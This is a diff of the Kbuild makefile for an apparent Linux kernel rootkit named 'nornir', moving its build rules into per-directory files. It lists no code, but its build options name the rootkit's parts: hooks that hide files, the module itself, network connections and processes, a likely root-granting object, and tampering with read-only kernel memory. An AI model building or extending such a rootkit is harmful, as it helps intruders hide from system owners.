@@ -1,72 +1,43 @@
-MODULE_NAME ?= nornir
-CONFIG_FILE ?= $(src)/../.config
+# SPDX-License-Identifier: GPL-2.0
 
+# module name
+MODULE_NAME ?= nornir
+obj-m += $(MODULE_NAME).o
+
+# configuration for the module
+CONFIG_FILE ?= $(src)/../.config
 include $(CONFIG_FILE)
 
+# header files
 ccflags-y += -I$(src)/include
+
+# general compilation flags
 ccflags-y += -Wunused-function
 ccflags-y += -Wundef
-
-obj-m += $(MODULE_NAME).o
 
 # entry point
 $(MODULE_NAME)-y += main.o
 
 # common gadgets
-$(MODULE_NAME)-y += common/logger.o
+include $(src)/common/Kbuild
 
 # fs
-$(MODULE_NAME)-$(CONFIG_NORNIR_HIDE_FILE)                           += fs/hide.o
-$(MODULE_NAME)-$(CONFIG_NORNIR_HIDE_FILE)                           += fs/syscall.o
-ccflags-$(CONFIG_NORNIR_HIDE_FILE)                                  += -DCONFIG_NORNIR_HIDE_FILE
-ccflags-$(CONFIG_NORNIR_HIDE_FILE_HIJACK_GETDENTS)                  += -DCONFIG_NORNIR_HIDE_FILE_HIJACK_GETDENTS
-ccflags-$(CONFIG_NORNIR_HIDE_FILE_HIJACK_GETDENTS_INLINE)           += -DCONFIG_NORNIR_HIDE_FILE_HIJACK_GETDENTS_INLINE
-ccflags-$(CONFIG_NORNIR_HIDE_FILE_HIJACK_GETDENTS_FTRACE)           += -DCONFIG_NORNIR_HIDE_FILE_HIJACK_GETDENTS_FTRACE
-ccflags-$(CONFIG_NORNIR_HIDE_FILE_HIJACK_GETDENTS_FILLDIR)          += -DCONFIG_NORNIR_HIDE_FILE_HIJACK_GETDENTS_FILLDIR
-ccflags-$(CONFIG_NORNIR_HIDE_FILE_HIJACK_GETDENTS_SYSCALL)          += -DCONFIG_NORNIR_HIDE_FILE_HIJACK_GETDENTS_SYSCALL
-ccflags-$(CONFIG_NORNIR_HIDE_FILE_HIJACK_GETDENTS_SYSCALL_TABLE)    += -DCONFIG_NORNIR_HIDE_FILE_HIJACK_GETDENTS_SYSCALL_TABLE
-$(MODULE_NAME)-$(CONFIG_NORNIR_HIDE_FILE_EXT4)                      += fs/ext4.o
-ccflags-$(CONFIG_NORNIR_HIDE_FILE_EXT4)                             += -DCONFIG_NORNIR_HIDE_FILE_EXT4
+include $(src)/fs/Kbuild
 
 # libs
-$(MODULE_NAME)-y                                += libs/hooks/base.o
-$(MODULE_NAME)-y                                += libs/hooks/dymasm.o
-$(MODULE_NAME)-y                                += libs/hooks/ftrace.o
-$(MODULE_NAME)-y                                += libs/ksym.o
-$(MODULE_NAME)-y                                += libs/mem.o
-ccflags-$(CONFIG_NORNIR_VMAP_TAMPER_ROMEM)      += -DCONFIG_NORNIR_VMAP_TAMPER_ROMEM
-ccflags-$(CONFIG_NORNIR_IOREMAP_TAMPER_ROMEM)   += -DCONFIG_NORNIR_IOREMAP_TAMPER_ROMEM
-ccflags-$(CONFIG_NORNIR_CR0_TAMPER_ROMEM)       += -DCONFIG_NORNIR_CR0_TAMPER_ROMEM
-ccflags-$(CONFIG_NORNIR_PGTBL_TAMPER_ROMEM)     += -DCONFIG_NORNIR_PGTBL_TAMPER_ROMEM
+include $(src)/libs/Kbuild
 
 # module
-$(MODULE_NAME)-y                                += mod/hide.o
-ccflags-$(CONFIG_NORNIR_HIDE_MOD)               += -DCONFIG_NORNIR_HIDE_MOD
-ccflags-$(CONFIG_NORNIR_HIDE_MOD_UNLINK_MODULE) += -DCONFIG_NORNIR_HIDE_MOD_UNLINK_MODULE
-ccflags-$(CONFIG_NORNIR_HIDE_MOD_UNLINK_KOBJ)   += -DCONFIG_NORNIR_HIDE_MOD_UNLINK_KOBJ
-ccflags-$(CONFIG_NORNIR_HIDE_MOD_UNLINK_VMAP)   += -DCONFIG_NORNIR_HIDE_MOD_UNLINK_VMAP
-ccflags-$(CONFIG_NORNIR_HIDE_MODE_UNLINK_USE)   += -DCONFIG_NORNIR_HIDE_MODE_UNLINK_USE
+include $(src)/mod/Kbuild
 
 # network
-$(MODULE_NAME)-y                                            += net/hide.o
-$(MODULE_NAME)-$(CONFIG_NORNIR_HIDE_TCP_CONN)               += net/tcp.o
-$(MODULE_NAME)-$(CONFIG_NORNIR_HIDE_UDP_CONN)               += net/udp.o
-ccflags-$(CONFIG_NORNIR_HIDE_CONN)                          += -DCONFIG_NORNIR_HIDE_CONN
-ccflags-$(CONFIG_NORNIR_HIDE_TCP_CONN)                      += -DCONFIG_NORNIR_HIDE_TCP_CONN
-ccflags-$(CONFIG_NORNIR_HIDE_TCP4_CONN)                     += -DCONFIG_NORNIR_HIDE_TCP4_CONN
-ccflags-$(CONFIG_NORNIR_HIDE_UDP_CONN)                      += -DCONFIG_NORNIR_HIDE_UDP_CONN
-ccflags-$(CONFIG_NORNIR_HIDE_UDP4_CONN)                     += -DCONFIG_NORNIR_HIDE_UDP4_CONN
-ccflags-$(CONFIG_NORNIR_HIDE_CONN_HIJACK_SEQ_SHOW)          += -DCONFIG_NORNIR_HIDE_CONN_HIJACK_SEQ_SHOW
-ccflags-$(CONFIG_NORNIR_HIDE_CONN_HIJACK_SEQ_SHOW_INLINE)   += -DCONFIG_NORNIR_HIDE_CONN_HIJACK_SEQ_SHOW_INLINE
-ccflags-$(CONFIG_NORNIR_HIDE_CONN_HIJACK_SEQ_SHOW_FTRACE)   += -DCONFIG_NORNIR_HIDE_CONN_HIJACK_SEQ_SHOW_FTRACE
+include $(src)/net/Kbuild
 
 # process subsystem
-$(MODULE_NAME)-y += proc/hide.o
-$(MODULE_NAME)-y += proc/root.o
+include $(src)/proc/Kbuild
 
 # userland interface
-$(MODULE_NAME)-$(CONFIG_NORNIR_PROCFS_UAPI)    += uapi/procfs_ui.o
-ccflags-$(CONFIG_NORNIR_PROCFS_UAPI)           += -DCONFIG_NORNIR_PROCFS_UAPI
+include $(src)/uapi/Kbuild
 
 # compilation flags for replacing internal macros
 KBUILD_CFLAGS := $(filter-out -pg, $(KBUILD_CFLAGS))
